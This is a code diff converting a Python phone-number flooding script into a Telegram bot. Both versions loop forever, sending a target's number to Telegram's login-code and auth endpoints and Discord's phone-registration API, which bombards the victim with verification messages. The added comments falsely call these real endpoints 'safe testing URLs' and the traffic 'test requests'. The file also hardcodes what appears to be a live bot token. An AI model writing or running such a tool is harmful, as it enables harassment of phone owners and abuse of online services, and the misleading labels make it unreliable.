@@ -1,153 +1,60 @@
 # === Imports ===
-import telebot     # Telegram Bot Library (important)
+import telebot
 import requests
 import fake_useragent
-import webbrowser
-from colored import cprint # type: ignore
-import os
-from pystyle import Anime, Colors, Colorate, Center
 
 # === Telegram Bot Setup ===
-TOKEN = "8294178048:AAFHWvl_MS9VdLsCsl9p28hNSq1nZIp1AXg"   # <- BotFather se milega
+TOKEN = "8294178048:AAFHWvl_MS9VdLsCsl9p28hNSq1nZIp1AXg"  # <-- Yaha apna BotFather se mila token dalna
 bot = telebot.TeleBot(TOKEN)
 
 # === Fake User Agent ===
 user = fake_useragent.UserAgent().random
-headers = {'user_agent' : user}
+headers = {'user-agent': user}
 
-# === Color Codes ===
-color_code = {
-    "reset": "\033[0m",
-    "underline": "\033[04m",
-    "green": "\033[32m",
-    "yellow": "\033[93m",
-    "red": "\033[31m",
-    "cyan": "\033[36m",
-    "bold": "\033[01m",
-    "pink": "\033[95m",
-    "url_l": "\033[36m",
-    "li_g": "\033[92m",
-    "f_cl": "\033[0m",
-    "dark": "\033[90m",
-}
+# === Dictionary to keep track of counts per user ===
+user_counts = {}
 
-# === Input Section ===
-number = int(input('Enter phone number -> '))
-count = 0
-nomer = number
-support = input('Press ENTER to start sending test requests: ')
+# === /start Command ===
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.send_message(message.chat.id, "Hello! Send me a phone number to start test requests.")
 
-# === Safe Loop (All APIs replaced with httpbin.org/post) ===try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
+# === Phone Number Handler ===
+@bot.message_handler(func=lambda m: True)
+def handle_number(message):
+    number = message.text.strip()
+    
+    if not number.isdigit():
+        bot.send_message(message.chat.id, "Please send a valid number.")
+        return
+    
+    count = 0
+    user_counts[message.chat.id] = count
+    bot.send_message(message.chat.id, f"Starting test requests for: {number}")
 
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
+    try:
+        while True:
+            # === Original APIs structure with safe testing URLs ===
+            # Telegram send_password (POST)
+            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
+            # Telegram support page (GET)
+            requests.get('https://telegram.org/support?setln=ru', headers=headers)
+            # Telegram auth (POST)
+            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
+            # Telegram send_password again (POST)
+            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
+            # Telegram support page again (GET)
+            requests.get('https://telegram.org/support?setln=ru', headers=headers)
+            # Telegram auth again (POST)
+            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
+            # Discord register phone (POST)
+            requests.post('ttps://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
+            
+            count += 1
+            user_counts[message.chat.id] = count
+            bot.send_message(message.chat.id, f"Test request sent {count} times for {number}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error occurred: {e}")
 
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
-try:
-    while True:
-        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
-        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
-        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
-        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
-        count += 1
-        print("Отправлено спама на поддержку телеграм:", {count})
-except Exception as e:
-    print('Ошибка')
+# === Start Polling ===
+bot.polling()
